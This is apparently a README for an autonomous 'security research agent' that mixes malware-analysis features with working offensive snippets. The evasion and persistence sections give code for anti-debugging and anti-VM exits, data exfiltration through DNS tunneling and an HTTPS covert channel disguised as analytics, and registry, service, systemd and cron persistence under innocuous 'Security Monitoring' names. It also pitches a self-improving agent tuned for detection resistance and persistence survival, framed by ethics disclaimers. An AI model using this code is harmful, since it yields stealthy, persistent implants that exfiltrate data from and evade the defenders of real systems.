# Self-Improving Security Research Agent - Complete Implementation Guide

## 🎯 Overview

The **Self-Improving Security Research Agent** is an advanced, autonomous security research platform designed for ethical security research, vulnerability assessment, and authorized penetration testing. This system combines cutting-edge malware analysis, vulnerability research, evasion techniques, and persistence mechanisms to create a comprehensive security research framework.

## ⚠️ Ethical Usage Notice

**This platform is designed exclusively for:**
- **Authorized security research** and vulnerability assessment
- **Ethical penetration testing** with proper authorization
- **Defensive security research** and threat intelligence
- **Academic security research** and educational purposes
- **Red team exercises** in controlled environments

**Strictly prohibited:**
- Unauthorized access to systems or networks
- Malicious activities or cybercrime
- Violation of laws or regulations
- Harm to individuals or organizations

## 🏗️ Architecture Overview



```mermaid
graph TB
    subgraph "Self-Improving Security Research Agent"
        A[Security Research Agent] --> B[Capability Analysis Engine]
        A --> C[Autonomous Research Modules]
        A --> D[Evasion & Stealth Module]
        A --> E[Persistence & Headless Module]
    end
    
    subgraph "Core Capabilities"
        B --> F[Malware Analysis]
        B --> G[Reverse Engineering]
        B --> H[Cryptographic Analysis]
        B --> I[C2 Protocol Extraction]
    end
    
    subgraph "Research Automation"
        C --> J[Exploit Database Monitoring]
        C --> K[Attack Technique Analysis]
        C --> L[Vulnerability Documentation]
        C --> M[AI-Driven Optimization]
    end
    
    subgraph "Evasion & Stealth"
        D --> N[Anti-Analysis Techniques]
        D --> O[Polymorphic Engine]
        D --> P[Stealth Communications]
        D --> Q[Process Injection]
    end
    
    subgraph "Persistence & Operation"
        E --> R[Multi-Platform Persistence]
        E --> S[Headless Operation]
        E --> T[Resource Optimization]
        E --> U[Anti-Forensics]
    end
```

## 🧠 Core Components

### 1. Security Research Agent (`security_research_agent.py`)

**Primary Capabilities:**
- **Malware Analysis**: Comprehensive static, dynamic, and advanced analysis
- **Vulnerability Research**: Autonomous monitoring and analysis of new exploits
- **Self-Improvement**: AI-driven optimization of research techniques
- **Learning Database**: Continuous learning from research results

**Key Features:**
```python
# Analyze malware samples
analysis = await agent.analyze_malware_sample("sample.exe", AnalysisDepth.HYBRID)

# Conduct autonomous vulnerability research
research = await agent.research_vulnerabilities(continuous=True)

# Optimize research techniques
optimization = await agent.optimize_techniques()
```

### 2. Capability Analysis Engine (`capability_analysis_engine.py`)

**Advanced Analysis Capabilities:**
- **Static Analysis**: PE/ELF analysis, string extraction, YARA rules
- **Dynamic Analysis**: Sandboxed execution, behavioral monitoring
- **Advanced Analysis**: Packer detection, shellcode extraction, code similarity
- **Cryptographic Analysis**: Algorithm detection, key size analysis, implementation review

**Malware Analysis Pipeline:**
```python
# Comprehensive malware analysis
malware_analysis = await capability_engine.analyze_malware_sample(
    sample_path="malware_sample.exe",
    depth=AnalysisDepth.ADVANCED
)

# Results include:
# - File type and architecture
# - C2 indicators and persistence mechanisms
# - Encryption schemes and privilege escalation vectors
# - Anti-analysis techniques and network behavior
```

### 3. Autonomous Research Modules (`autonomous_research_modules.py`)

**Research Automation:**
- **Exploit Database Monitoring**: Real-time monitoring of CVE databases
- **Attack Technique Analysis**: Classification and complexity assessment
- **Vulnerability Documentation**: Automated report generation
- **Exploit Chaining**: Analysis of multi-stage attack possibilities

**Continuous Research Workflow:**
```python
# Monitor for new vulnerabilities
new_exploits = await research_modules.monitor_exploit_databases()

# Analyze attack techniques
techniques = await research_modules.analyze_attack_techniques(new_exploits)

# Document findings
documentation = await research_modules.document_vulnerabilities(techniques)

# Test exploit chaining
chaining_results = await research_modules.test_exploit_chaining(techniques)
```

### 4. Evasion & Stealth Module (`evasion_stealth_module.py`)

**Multi-Layered Evasion:**
- **Application Layer**: Anti-debugging, anti-VM, code obfuscation
- **System Layer**: Process hiding, privilege escalation, anti-forensics
- **Network Layer**: Covert channels, steganography, protocol tunneling
- **Cryptographic Layer**: Encrypted communications, key management

**Evasion Techniques:**
```python
# Create comprehensive evasion plan
evasion_plan = await evasion_manager.create_evasion_plan(config)

# Execute with stealth
results = await evasion_manager.execute_evasion_plan(operation_id)

# Available techniques:
# - Anti-analysis (debugging, VM, sandbox detection)
# - Polymorphic/metamorphic code generation
# - Stealth communications (DNS, ICMP, HTTPS tunneling)
# - Process injection (DLL, process hollowing, atom bombing)
```

### 5. Persistence & Headless Module (`persistence_headless.py`)

**Persistence Mechanisms:**
- **Windows**: Registry, services, scheduled tasks, startup folder
- **Linux**: Cron jobs, systemd services, init scripts
- **macOS**: Launch agents, launch daemons
- **Cross-Platform**: Universal persistence techniques

**Headless Operation:**
```python
# Configure headless operation
config = HeadlessOperation(
    operation_mode=OperationMode.HEADLESS,
    resource_limits={"cpu": "50%", "memory": "512MB"},
    persistence_mechanisms=[PersistenceType.CRON_JOB],
    stealth_level=0.8
)

# Start autonomous operation
operation = await headless_manager.start_headless_operation(config)
```

## 🛠️ Advanced Capabilities

### **Malware Analysis Pipeline**

#### **Static Analysis**
- **PE/ELF Analysis**: Section analysis, import/export tables, entry points
- **String Analysis**: URL extraction, domain detection, IP identification
- **YARA Rules**: Custom rule matching and signature detection
- **Cryptographic Detection**: Algorithm identification, key size analysis

#### **Dynamic Analysis**
- **Sandboxed Execution**: Isolated environment for safe analysis
- **Behavioral Monitoring**: File system, registry, network, process activity
- **Network Traffic Analysis**: C2 communication, data exfiltration patterns
- **Memory Forensics**: Process memory analysis and injection detection

#### **Advanced Analysis**
- **Packer Detection**: UPX, Themida, VMProtect, custom packers
- **Shellcode Extraction**: Automatic extraction and analysis
- **Code Similarity**: Malware family classification and attribution
- **Behavioral Analysis**: Risk scoring and threat assessment

### **Vulnerability Research Automation**

#### **Exploit Database Monitoring**
```python
# Real-time monitoring of security databases
databases = [
    "https://cve.circl.lu/",
    "https://www.exploit-db.com/",
    "https://packetstormsecurity.com/"
]

# Automated analysis of new exploits
for exploit in new_exploits:
    technique = await analyze_attack_technique(exploit)
    documentation = await generate_vulnerability_report(technique)
```

#### **Attack Technique Classification**
- **Attack Vector**: Network, Local, Web, Social, Physical
- **Complexity Assessment**: High, Medium, Low complexity analysis
- **Mitigation Strategies**: Automated recommendation generation
- **Exploit Chaining**: Multi-stage attack possibility analysis

#### **AI-Driven Optimization**
```python
# Performance analysis and optimization
performance_data = analyze_research_performance()
optimization_opportunities = identify_improvements(performance_data)

for opportunity in optimization_opportunities:
    optimized_technique = await generate_optimized_technique(opportunity)
    validate_improvement(optimized_technique)
```

### **Evasion & Stealth Techniques**

#### **Anti-Analysis Techniques**
```python
# Anti-debugging
if kernel32.IsDebuggerPresent():
    sys.exit(0)

# Anti-VM detection
if os.path.exists("C:\\windows\\vmtoolsd.exe"):
    sys.exit(0)

# Anti-sandbox timing
start = time.time()
sensitive_operation()
if time.time() - start > EXPECTED_TIME:
    sys.exit(0)
```

#### **Polymorphic Code Generation**
```python
# Generate unique code instances
original_code = "def malicious_function(): pass"

polymorphic = polymorphic_engine.generate_polymorphic_code(
    original_code, 
    mutation_level=5
)

metamorphic = polymorphic_engine.generate_metamorphic_code(
    original_code,
    iterations=3
)
```

#### **Stealth Communications**
```python
# DNS tunneling
def send_data_via_dns(data, domain):
    encoded_data = base64.b64encode(data.encode()).decode()
    chunks = [encoded_data[i:i+50] for i in range(0, len(encoded_data), 50)]
    
    for chunk in chunks:
        subdomain = f"{chunk}.{domain}"
        dns.resolver.resolve(subdomain, 'A')

# HTTPS covert channel
def covert_https_communication(data, url):
    payload = {
        "analytics_data": base64.b64encode(data.encode()).decode(),
        "timestamp": int(time.time())
    }
    requests.post(url, json=payload, headers=legitimate_headers)
```

### **Persistence Mechanisms**

#### **Windows Persistence**
```python
# Registry persistence
key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                   0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "SecurityService", 0, winreg.REG_SZ, 
                 os.path.abspath(__file__))

# Service creation
service_config = {
    "service_name": "SecurityMonitoring",
    "display_name": "Security Monitoring Service",
    "executable_path": os.path.abspath(__file__),
    "start_type": "auto"
}
create_windows_service(service_config)
```

#### **Linux Persistence**
```python
# Systemd service
service_content = f"""
[Unit]
Description=Security Monitoring Service
After=network.target

[Service]
Type=simple
User=root
ExecStart={os.path.abspath(__file__)}
Restart=always

[Install]
WantedBy=multi-user.target
"""

# Cron job
cron_entry = f"@reboot {os.path.abspath(__file__)}"
subprocess.run(f'echo "{cron_entry}" | crontab -', shell=True)
```

#### **Cross-Platform Persistence**
```python
# Universal persistence techniques
universal_persistence = [
    "user_startup_scripts",
    "scheduled_tasks", 
    "system_services",
    "kernel_modules",
    "boot_sector_modification"
]
```

## 🎯 Operation Modes

### **1. Research Mode**
- **Purpose**: Vulnerability research and analysis
- **Duration**: Continuous operation
- **Resources**: Full system resources available
- **Stealth**: Standard security practices

### **2. Assessment Mode**
- **Purpose**: Security assessment and testing
- **Duration**: Time-limited engagement
- **Resources**: Controlled resource usage
- **Stealth**: Minimal footprint

### **3. Red Team Mode**
- **Purpose**: Authorized penetration testing
- **Duration**: Exercise duration
- **Resources**: Optimized for stealth
- **Stealth**: Maximum evasion

### **4. Incident Response Mode**
- **Purpose**: Incident investigation
- **Duration**: Emergency response
- **Resources**: Priority access
- **Stealth**: Forensic preservation

## 🔧 Configuration & Deployment

### **System Requirements**
- **Operating System**: Linux (Ubuntu 20.04+), Windows 10+, macOS 10.15+
- **Python**: 3.8+ with required dependencies
- **Memory**: Minimum 8GB, Recommended 16GB+
- **Storage**: Minimum 100GB, Recommended 500GB+
- **Network**: Internet connection for research databases

### **Installation**
```bash
# Clone repository
git clone https://github.com/your-org/self-improving-security-research.git
cd self-improving-security-research

# Install dependencies
pip install -r requirements.txt

# Setup configuration
cp config/config.yaml.example config/config.yaml
nano config/config.yaml

# Initialize research database
python scripts/init_database.py

# Start research agent
python main.py --mode research
```

### **Configuration**
```yaml
# config/config.yaml
research_agent:
  operation_mode: "research"
  stealth_level: 0.8
  resource_limits:
    cpu: "80%"
    memory: "8GB"
    network: "1GB"
  
  research_modules:
    exploit_monitoring: true
    vulnerability_analysis: true
    technique_optimization: true
    continuous_learning: true
  
  evasion_settings:
    anti_analysis: true
    polymorphic_code: true
    stealth_communications: true
    persistence_mechanisms: ["cron_job", "systemd_service"]
  
  databases:
    exploit_db: "https://www.exploit-db.com"
    cve_database: "https://cve.circl.lu"
    threat_intel: "https://threatintel.example.com"
```

## 📊 Performance Metrics

### **Research Effectiveness**
- **Vulnerability Discovery Rate**: New vulnerabilities per day
- **Analysis Accuracy**: False positive/negative rates
- **Research Speed**: Time from discovery to analysis
- **Knowledge Retention**: Learning database effectiveness

### **Stealth & Evasion**
- **Detection Resistance**: Success rate against security tools
- **Persistence Survival**: Time before detection/removal
- **Communication Stealth**: Covert channel success rate
- **Resource Efficiency**: Minimal footprint achievement

### **Operational Metrics**
- **System Resource Usage**: CPU, memory, network consumption
- **Reliability**: Uptime and error rates
- **Scalability**: Concurrent operation capacity
- **Maintenance**: Update and optimization frequency

## 🛡️ Security & Ethics

### **Responsible Disclosure**
```python
# Vulnerability disclosure workflow
async def responsible_disclosure(vulnerability):
    # 1. Validate vulnerability
    validation = await validate_vulnerability(vulnerability)
    
    # 2. Notify vendor
    await notify_vendor(vulnerability, validation)
    
    # 3. Wait for vendor response (90 days)
    await wait_vendor_response(vulnerability)
    
    # 4. Coordinate public disclosure
    if vendor_patches_available():
        await public_disclosure(vulnerability)
    else:
        await extend_disclosure_deadline(vulnerability)
```

### **Research Ethics**
- **Authorization**: Always obtain proper authorization
- **Scope Limitation**: Strict adherence to defined scope
- **Data Protection**: Protect sensitive information
- **Legal Compliance**: Follow all applicable laws
- **Beneficial Purpose**: Use research for security improvement

### **Safety Mechanisms**
```python
# Safety checks and limitations
class SafetyManager:
    def __init__(self):
        self.safety_limits = {
            "max_network_connections": 100,
            "max_file_modifications": 50,
            "max_system_changes": 10,
            "research_duration": timedelta(days=30)
        }
    
    async def check_safety_limits(self, operation):
        # Enforce safety limits
        if operation.network_connections > self.safety_limits["max_network_connections"]:
            raise SafetyViolation("Too many network connections")
        
        if operation.duration > self.safety_limits["research_duration"]:
            raise SafetyViolation("Research duration exceeded")
```

## 📈 Learning & Improvement

### **Continuous Learning**
```python
# Learning database management
class LearningDatabase:
    def __init__(self):
        self.analysis_results = {}
        self.technique_performance = {}
        self.optimization_history = {}
    
    async def store_analysis_result(self, result):
        # Store for future reference
        self.analysis_results[result.id] = result
        
        # Update performance metrics
        await self.update_performance_metrics(result)
        
        # Identify optimization opportunities
        opportunities = await self.identify_improvements(result)
        
        # Apply optimizations
        for opportunity in opportunities:
            await self.apply_optimization(opportunity)
```

### **Technique Optimization**
```python
# AI-driven optimization
async def optimize_research_techniques():
    # Analyze performance data
    performance_data = await collect_performance_metrics()
    
    # Identify patterns
    patterns = await analyze_performance_patterns(performance_data)
    
    # Generate optimizations
    optimizations = await generate_technique_optimizations(patterns)
    
    # Validate improvements
    for optimization in optimizations:
        improvement = await validate_optimization(optimization)
        if improvement.success_rate > current_performance:
            await adopt_optimization(optimization)
```

### **Knowledge Integration**
```python
# Integrate external knowledge
async def integrate_security_research():
    # Monitor academic papers
    papers = await monitor_security_conferences()
    
    # Extract techniques
    techniques = await extract_techniques_from_papers(papers)
    
    # Validate techniques
    validated = await validate_new_techniques(techniques)
    
    # Integrate into system
    for technique in validated:
        await integrate_technique(technique)
```

## 🧪 Testing & Validation

### **Unit Testing**
```python
# Test individual components
class TestSecurityResearchAgent:
    async def test_malware_analysis(self):
        sample = "test_sample.exe"
        analysis = await agent.analyze_malware_sample(sample)
        assert analysis.sample_hash is not None
        assert len(analysis.capabilities) > 0
    
    async def test_vulnerability_research(self):
        research = await agent.research_vulnerabilities()
        assert len(research["new_exploits"]) >= 0
        assert len(research["techniques"]) >= 0
```

### **Integration Testing**
```python
# Test component integration
class TestIntegration:
    async def test_research_pipeline(self):
        # Start with malware analysis
        analysis = await agent.analyze_malware_sample("sample.exe")
        
        # Use analysis for vulnerability research
        research = await agent.research_vulnerabilities()
        
        # Optimize based on results
        optimization = await agent.optimize_techniques()
        
        # Validate pipeline
        assert optimization["performance_improvements"] > 0
```

### **Performance Testing**
```python
# Test system performance
class TestPerformance:
    async def test_resource_usage(self):
        # Monitor resource consumption
        initial_usage = await get_resource_usage()
        
        # Run intensive research
        await agent.conduct_intensive_research()
        
        # Check resource limits
        final_usage = await get_resource_usage()
        assert final_usage.memory < MEMORY_LIMIT
        assert final_usage.cpu < CPU_LIMIT
```

## 📚 Documentation & Reporting

### **Research Reports**
```python
# Generate comprehensive reports
async def generate_research_report(research_data):
    report = {
        "executive_summary": await generate_summary(research_data),
        "technical_analysis": await generate_technical_details(research_data),
        "vulnerabilities": await analyze_vulnerabilities(research_data),
        "recommendations": await generate_recommendations(research_data),
        "appendix": await generate_appendix(research_data)
    }
    
    return report
```

### **Vulnerability Documentation**
```python
# Document new vulnerabilities
async def document_vulnerability(vulnerability):
    documentation = {
        "vulnerability_id": vulnerability.id,
        "discovery_date": vulnerability.discovered_at,
        "technical_details": vulnerability.technical_analysis,
        "proof_of_concept": vulnerability.poc,
        "mitigation_strategies": vulnerability.mitigations,
        "affected_systems": vulnerability.affected_systems,
        "risk_assessment": vulnerability.risk_analysis
    }
    
    await save_documentation(documentation)
```

## 🚀 Advanced Features

### **Distributed Research**
```python
# Coordinate multiple research nodes
class DistributedResearchManager:
    def __init__(self):
        self.research_nodes = []
        self.coordination_service = None
    
    async def coordinate_research(self, research_tasks):
        # Distribute tasks across nodes
        for task in research_tasks:
            node = await select_optimal_node(task)
            await node.execute_research_task(task)
        
        # Collect results
        results = await collect_all_results()
        return await consolidate_results(results)
```

### **Cloud Integration**
```python
# Cloud-based research capabilities
class CloudResearchIntegration:
    def __init__(self):
        self.cloud_providers = ["aws", "azure", "gcp"]
        self.scaling_manager = None
    
    async def scale_research_to_cloud(self, research_load):
        # Provision cloud resources
        resources = await provision_cloud_resources(research_load)
        
        # Distribute research tasks
        await distribute_to_cloud_instances(resources, research_load)
        
        # Monitor and optimize
        await monitor_cloud_research(resources)
```

### **Threat Intelligence Integration**
```python
# Integrate with threat intelligence feeds
class ThreatIntelligenceIntegration:
    def __init__(self):
        self.threat_feeds = [
            "misp",
            "virustotal",
            "alienvault_otx",
            "recorded_future"
        ]
    
    async def enrich_research_with_threat_intel(self, research_data):
        # Query threat intelligence feeds
        threat_data = await query_threat_feeds(research_data)
        
        # Enrich analysis
        enriched_analysis = await enrich_analysis(research_data, threat_data)
        
        return enriched_analysis
```

## 🎯 Best Practices

### **Research Methodology**
1. **Systematic Approach**: Follow structured research methodology
2. **Documentation**: Document all research processes and findings
3. **Validation**: Validate all findings through multiple methods
4. **Peer Review**: Subject research to peer review and validation
5. **Continuous Improvement**: Regularly update and improve techniques

### **Operational Security**
1. **Environment Isolation**: Use isolated research environments
2. **Data Protection**: Protect sensitive research data
3. **Access Control**: Implement strict access controls
4. **Audit Logging**: Maintain comprehensive audit logs
5. **Backup & Recovery**: Regular backups and recovery procedures

### **Ethical Considerations**
1. **Authorization**: Always obtain proper authorization
2. **Scope Adherence**: Strictly follow authorized scope
3. **Responsible Disclosure**: Follow responsible disclosure practices
4. **Privacy Protection**: Protect individual privacy rights
5. **Legal Compliance**: Ensure compliance with all laws

## 🔮 Future Enhancements

### **Planned Features**
- **Machine Learning Integration**: Advanced ML for pattern recognition
- **Quantum-Resistant Cryptography**: Prepare for quantum computing threats
- **Advanced Threat Hunting**: Proactive threat detection capabilities
- **Automated Remediation**: Automatic vulnerability patching
- **Predictive Analysis**: Predict future attack vectors

### **Research Directions**
- **AI-Powered Analysis**: Enhanced AI for security research
- **Collaborative Research**: Multi-party research coordination
- **Real-Time Threat Detection**: Instantaneous threat identification
- **Autonomous Defense**: Self-defending systems
- **Zero-Trust Architecture**: Complete zero-trust implementation

---

## 🎉 Conclusion

The **Self-Improving Security Research Agent** represents the pinnacle of autonomous security research technology, combining:

- **Advanced Malware Analysis** - Comprehensive static, dynamic, and advanced analysis
- **Autonomous Vulnerability Research** - Continuous monitoring and analysis
- **AI-Driven Optimization** - Self-improving research techniques
- **Multi-Layered Evasion** - Advanced stealth and anti-analysis capabilities
- **Cross-Platform Persistence** - Universal persistence mechanisms
- **Headless Operation** - Autonomous, resource-optimized operation

This platform provides security researchers with unprecedented capabilities for conducting ethical security research, vulnerability assessment, and threat intelligence analysis. The self-improving nature ensures that the system continuously evolves and adapts to new threats and techniques.

**Ready to advance your security research capabilities?** Deploy the Self-Improving Security Research Agent and experience the future of autonomous security research.

---

*For additional information, visit our documentation at https://docs.security-research-agent.com or contact our research team at research@security-research-agent.com*

**⚠️ Remember**: Use only for authorized security research and ethical purposes. Unauthorized use is strictly prohibited and may violate laws and regulations.
